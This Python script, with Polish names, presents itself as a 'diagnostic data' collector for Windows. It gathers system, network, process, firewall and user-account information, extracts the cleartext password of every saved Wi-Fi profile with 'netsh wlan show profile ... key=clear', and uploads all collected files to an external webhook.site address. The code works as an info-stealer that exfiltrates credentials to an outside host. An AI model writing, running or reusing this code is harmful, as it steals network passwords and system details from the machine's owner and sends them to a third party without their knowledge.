import os
import subprocess
import requests

import funk

SCIEZKA_DO_FOLDERU = "C:\\dane_diagnostyczne"


def main():
    if not funk.czy_znaleziono_folder("c:\\dane_diagnostyczne"):
        os.mkdir("C:\\dane_diagnostyczne")

    funk.usun_pliki_z_diagnozy()
    funk.uruchom_komende("systeminfo", "C:\\dane_diagnostyczne\\info.txt")
    funk.uruchom_komende("ipconfig", "C:\\dane_diagnostyczne\\ip.txt")
    funk.uruchom_komende("ipconfig /all", "C:\\dane_diagnostyczne\\ip2.txt")
    funk.run_powershell_command("Get-Process", "C:\\dane_diagnostyczne\\dane1.txt")
    funk.run_powershell_command("Get-WmiObject Win32_PhysicalMemory", "C:\\dane_diagnostyczne\\dane2.txt")
    funk.uruchom_komende("netstat", "C:\\dane_diagnostyczne\\net_test.txt")
    funk.run_powershell_command("Get-NetAdapter", "C:\\dane_diagnostyczne\\kartysieciowe.txt")
    funk.run_powershell_command("Get-NetConnectionProfile", "C:\\dane_diagnostyczne\\karty_bardziej_dokładnie.txt")
    funk.run_powershell_command("Get-WmiObject -Class Win32_LogicalDisk", "C:\\dane_diagnostyczne\\dyski.txt")
    funk.run_powershell_command("Get-NetTCPConnection", "C:\\dane_diagnostyczne\\ip3.txt")
    funk.run_powershell_command("Get-NetUDPEndpoint", "C:\\dane_diagnostyczne\\ip4.txt")
    funk.run_powershell_command("Get-NetFirewallSetting | Select-Object", "C:\\dane_diagnostyczne\\siec2.txt")
    funk.run_powershell_command("Get-WmiObject -Class Win32_UserAccount", "C:\\dane_diagnostyczne\\użytkownicy.txt")
    funk.run_powershell_command("netsh wlan show profile", "C:\\dane_diagnostyczne\\wifi.txt")
    wifi_profiles = funk.extract_wifi_profiles(funk.file_path)
    x: int = 0
    for wifi in wifi_profiles:
        funk.run_powershell_command(f'netsh wlan show profile {wifi} key=clear', f'C:\\dane_diagnostyczne\\haslaDowiFI{x}.txt')
        x += 1

    # compressAndSend(folderPath, zipFileName, destinationIP);  funkcja od wysyłania


if __name__ == "__main__":
    main()
    webhook_url = "https://webhook.site/23b24b8d-4ef3-4e73-b9ad-ed17749b1e0d"
    folder_path = "C:\\dane_diagnostyczne"
    nazwy_plikow = funk.lista_plikow_w_folderze(folder_path)
    if nazwy_plikow:
        for nazwa_pliku in nazwy_plikow:
            funk.wyslij_plik_do_webhooka(webhook_url, folder_path, nazwa_pliku)


